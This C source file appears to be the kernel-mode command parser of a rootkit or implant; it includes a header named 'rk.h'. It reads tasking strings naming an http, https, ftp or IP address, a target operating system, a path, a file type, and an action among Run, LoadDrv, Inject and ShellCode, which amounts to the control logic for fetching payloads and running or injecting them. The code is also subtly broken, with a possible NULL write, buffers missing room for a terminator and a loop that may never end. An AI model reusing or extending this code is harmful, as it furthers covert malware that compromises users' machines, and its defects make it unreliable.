#include "rk.h"
#include "Utils.h"
#include "CommandLine.h"

LIST_ENTRY g_CommandListPack;
KSPIN_LOCK g_CommandListSpinLock;


PCHAR GetNextCmdLine(PCHAR pCmdLineA,PBOOLEAN pbIsEnd)
{
    PCHAR pTmpCmd;

    if (NULL == pCmdLineA)
    {
        return NULL;
    }
    pCmdLineA = MyStrChr(pCmdLineA,':');
    if (pCmdLineA)
    {
        pCmdLineA[0] = '\0';
        pCmdLineA += 1;
        pTmpCmd = MyStrChr(pCmdLineA,':');
        if (NULL == pTmpCmd)
        {
            pTmpCmd = MyStrChr(pCmdLineA,';');
            if (pTmpCmd)
            {
                pTmpCmd[0] = '\0';
                *pbIsEnd = TRUE;
            }
        }
        pTmpCmd[0] = '\0';
    }
    return pCmdLineA;
}

COMMAND_LINE_TYPE GetCommandLineType(PCHAR pCmdLineA)
{
    if (__STRNCMPI__(pCmdLineA,"Run",__STRLEN__("Run")) == 0)
    {
        return CmdRun;
    }
    else if (__STRNCMPI__(pCmdLineA,"LoadDrv",__STRLEN__("LoadDrv")) == 0)
    {
        return LoadDrv;
    }
    else if (__STRNCMPI__(pCmdLineA,"Inject",__STRLEN__("Inject")) == 0)
    {
        return Inject;
    }
    else if (__STRNCMPI__(pCmdLineA,"ShellCode",__STRLEN__("ShellCode")) == 0)
    {
        return ShellCode;
    }
    else
    {
        return ShellCode;
    }
}
FILE_TYPE_SUFFIX GetFileSuffixType(PCHAR pSuffixType)
{
    if (__STRNCMPI__(pSuffixType,"Exe",__STRLEN__("Exe")) == 0)
    {
        return FileTypeExe;
    }
    else if (__STRNCMPI__(pSuffixType,"Dll",__STRLEN__("Dll")) == 0)
    {
        return FileTypeDll;
    }
    else if (__STRNCMPI__(pSuffixType,"Sys",__STRLEN__("Sys")) == 0)
    {
        return FileTypeSys;
    }
    else if (__STRNCMPI__(pSuffixType,"Elf",__STRLEN__("Elf")) == 0)
    {
        return FileTypeElf;
    }
    else if (__STRNCMPI__(pSuffixType,"So",__STRLEN__("So")) == 0)
    {
        return FileTypeSo;
    }
    else if (__STRNCMPI__(pSuffixType,"Bin",__STRLEN__("Bin")) == 0)
    {
        return FileTypeBin;
    }
    else
    {
        return FileTypeBin;
    }
}
SYSTEM_TYPE GetSystemType(PCHAR pSystemA)
{
    if (__STRNCMPI__(pSystemA,"Windows",__STRLEN__("Windows")) == 0)
    {
        return Windows;
    }
    else if (__STRNCMPI__(pSystemA,"MacOs",__STRLEN__("MacOs")) == 0)
    {
        return MacOs;
    }
    else if (__STRNCMPI__(pSystemA,"Linux",__STRLEN__("Linux")) == 0)
    {
        return Linux;
    }
    else if (__STRNCMPI__(pSystemA,"CentOs",__STRLEN__("CentOs")) == 0)
    {
        return CentOs;
    }
    else if (__STRNCMPI__(pSystemA,"FreeBSD",__STRLEN__("FreeBSD")) == 0)
    {
        return FreeBSD;
    }
    else
    {
        return Unknow;
    }
}
void ParseCommandLine(PCHAR pCmdLineA,PCOMMAND_LINE_PACK *ppCmdLinePack)
{
    PCHAR pCurCmd;
    PCHAR pLocalDat;
    BOOLEAN bIsEnd;

    pLocalDat = NULL;
    bIsEnd = FALSE;

    if (NULL == pCmdLineA || NULL == *ppCmdLinePack)
    {
        return;
    }
    do 
    {
        pLocalDat = KernelMalloc(__STRLEN__(pCmdLineA));
    } while (NULL == pLocalDat);
    RtlZeroMemory(pLocalDat,__STRLEN__(pCmdLineA));
    RtlCopyMemory(pLocalDat,pCmdLineA,__STRLEN__(pCmdLineA));
    pCurCmd = MyStrChr(pLocalDat,':');
    if (pCurCmd)
    {
        pCurCmd[0] = '\0';
        pCurCmd += 1;
    }
    RtlCopyMemory((*ppCmdLinePack)->CmdSignatureA,pLocalDat,__STRLEN__(pLocalDat));
    while (TRUE)
    {
        if (__STRNCMPI__(pCurCmd,"https",__STRLEN__("https")) == 0)
        {
            (*ppCmdLinePack)->AddressType = HttpsAddress;
            pCurCmd = GetNextCmdLine(pCurCmd,&bIsEnd);
            if (pCurCmd)
            {
                RtlCopyMemory((*ppCmdLinePack)->AddressDatA,pCurCmd,__STRLEN__(pCurCmd));
                pCurCmd += __STRLEN__(pCurCmd) + sizeof(CHAR);
            }
        }
        else if (__STRNCMPI__(pCurCmd,"http",__STRLEN__("http")) == 0)
        {
            (*ppCmdLinePack)->AddressType = HttpAddress;
            pCurCmd = GetNextCmdLine(pCurCmd,&bIsEnd);
            if (pCurCmd)
            {
                RtlCopyMemory((*ppCmdLinePack)->AddressDatA,pCurCmd,__STRLEN__(pCurCmd));
                pCurCmd += __STRLEN__(pCurCmd) + sizeof(CHAR);
            }
        }
        else if (__STRNCMPI__(pCurCmd,"ftp",__STRLEN__("ftp")) == 0)
        {
            (*ppCmdLinePack)->AddressType = FtpAddress;
            pCurCmd = GetNextCmdLine(pCurCmd,&bIsEnd);
            if (pCurCmd)
            {
                RtlCopyMemory((*ppCmdLinePack)->AddressDatA,pCurCmd,__STRLEN__(pCurCmd));
                pCurCmd += __STRLEN__(pCurCmd) + sizeof(CHAR);
            }
        }
        else if (__STRNCMPI__(pCurCmd,"ip",__STRLEN__("ip")) == 0)
        {
            (*ppCmdLinePack)->AddressType = IpAddress;
            pCurCmd = GetNextCmdLine(pCurCmd,&bIsEnd);
            if (pCurCmd)
            {
                RtlCopyMemory((*ppCmdLinePack)->AddressDatA,pCurCmd,__STRLEN__(pCurCmd));
                pCurCmd += __STRLEN__(pCurCmd) + sizeof(CHAR);
            }
        }
        else if (__STRNCMPI__(pCurCmd,"System",__STRLEN__("System")) == 0)
        {
            pCurCmd = MyStrChr(pCurCmd,':');
            pCurCmd = GetNextCmdLine(pCurCmd,&bIsEnd);
            if (pCurCmd)
            {
                (*ppCmdLinePack)->SystemType = GetSystemType(pCurCmd);
                pCurCmd += __STRLEN__(pCurCmd) + sizeof(CHAR);
            }
        }
        else if (__STRNCMPI__(pCurCmd,"Path",__STRLEN__("Path")) == 0)
        {
            pCurCmd = MyStrChr(pCurCmd,':');
            pCurCmd = GetNextCmdLine(pCurCmd,&bIsEnd);
            if (pCurCmd)
            {
                RtlCopyMemory((*ppCmdLinePack)->PathDatA,pCurCmd,__STRLEN__(pCurCmd));
                pCurCmd += __STRLEN__(pCurCmd) + sizeof(CHAR);
            }
        }
        else if (__STRNCMPI__(pCurCmd,"Type",__STRLEN__("Type")) == 0)
        {
            pCurCmd = GetNextCmdLine(pCurCmd,&bIsEnd);
            if (pCurCmd)
            {
                (*ppCmdLinePack)->FileTypeSuffix = GetFileSuffixType(pCurCmd);
                pCurCmd += __STRLEN__(pCurCmd) + sizeof(CHAR);
            }
        }
        else if (__STRNCMPI__(pCurCmd,"Command",__STRLEN__("Command")) == 0)
        {
            pCurCmd = GetNextCmdLine(pCurCmd,&bIsEnd);
            if (pCurCmd)
            {
                (*ppCmdLinePack)->CommandLineType = GetCommandLineType(pCurCmd);
                pCurCmd += __STRLEN__(pCurCmd) + sizeof(CHAR);
            }
        }
        else
        {
        }
        if (bIsEnd)
        {
            break;
        }
    }
    if (pLocalDat)
    {
        KernelFree(pLocalDat);
    }
    return;
}

BOOLEAN ProcessCommandLine(PCHAR pCmdLineA,PCOMMAND_LINE_PACK *pRetCmdLinePack)
{
    PCOMMAND_LINE_PACK pCmdLinePack;

    if (NULL == pCmdLineA)
    {
        return FALSE;
    }
    pCmdLinePack = NULL;
    *pRetCmdLinePack = NULL;
    do 
    {
        *pRetCmdLinePack = (PCOMMAND_LINE_PACK)KernelMalloc(sizeof(COMMAND_LINE_PACK));
    } while (NULL == *pRetCmdLinePack);
    RtlZeroMemory(*pRetCmdLinePack,sizeof(COMMAND_LINE_PACK));
    ParseCommandLine(pCmdLineA,pRetCmdLinePack);
    if (*(PULONG_PTR)((*pRetCmdLinePack)->CmdSignatureA))
    {
        return TRUE;
    }
    return FALSE;
}